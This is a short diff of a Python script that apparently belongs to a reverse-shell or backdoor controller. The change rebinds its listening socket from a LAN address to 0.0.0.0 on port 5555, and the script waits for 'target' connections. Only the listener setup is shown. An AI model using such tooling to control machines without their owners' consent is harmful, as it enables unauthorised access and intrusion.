@@ -54,7 +54,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.0.110', 5555))
+sock.bind(('0.0.0.0', 5555)) ## Enter the server's ip address and port number.
 sock.listen(5)
 print('[+] Listening For Incoming Connections...')
 
